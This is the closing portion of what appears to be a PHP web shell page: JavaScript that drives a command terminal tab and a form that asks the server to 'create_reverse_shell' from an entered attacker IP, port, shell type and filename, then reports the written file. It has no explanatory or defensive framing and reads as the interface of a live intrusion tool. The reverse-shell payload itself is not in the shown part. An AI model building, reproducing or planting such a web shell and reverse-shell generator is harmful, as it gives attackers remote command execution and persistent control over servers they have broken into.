        function generateShell() {
            const mode = document.getElementById('shell-mode').value;
            const ip = document.getElementById('shell-ip').value.trim();
            const port = document.getElementById('shell-port').value;
            const type = document.getElementById('shell-type').value;
            const filename = document.getElementById('shell-filename').value.trim();
            if (!port || !filename) {
                alert('Please fill all required fields');
                return;
            }
            if (mode === 'reverse' && !ip) {
                alert('Please enter your IP address for reverse shell');
                return;
            }
            document.getElementById('loading').style.display = 'block';
            document.getElementById('instructions-box').style.display = 'none';
            const formData = new FormData();
            formData.append('mode', mode);
            formData.append('ip', ip);
            formData.append('port', port);
            formData.append('type', type);
            formData.append('filename', filename);
            fetch('?action=create_reverse_shell', {method: 'POST', body: formData})
                .then(r => r.json())
                .then(data => {
                    document.getElementById('loading').style.display = 'none';
                    if (data.success) {
                        document.getElementById('instructions-content').innerHTML = data.instructions;
                        document.getElementById('instructions-box').style.display = 'block';
                        alert('✅ ' + data.message + '\n\nFile: ' + data.filepath + '\nSize: ' + data.size + ' bytes');
                    } else {
                        alert('❌ Error: ' + data.message);
                    }
                })
                .catch(error => {
                    document.getElementById('loading').style.display = 'none';
                    alert('Error: ' + error.message);
                });
        }

        // Initialization
        document.addEventListener('DOMContentLoaded', function() {
            toggleShellMode();
            addTerminalLine('', 'output', true);
            <?php if ($active_tab === 'terminal'): ?>
                setTimeout(() => document.getElementById('cmd-input').focus(), 100);
            <?php endif; ?>
            window.onclick = function(event) {
                document.querySelectorAll('.modal').forEach(modal => {
                    if (event.target === modal) modal.style.display = 'none';
                });
            };
        });
    </script>
</body>
</html>
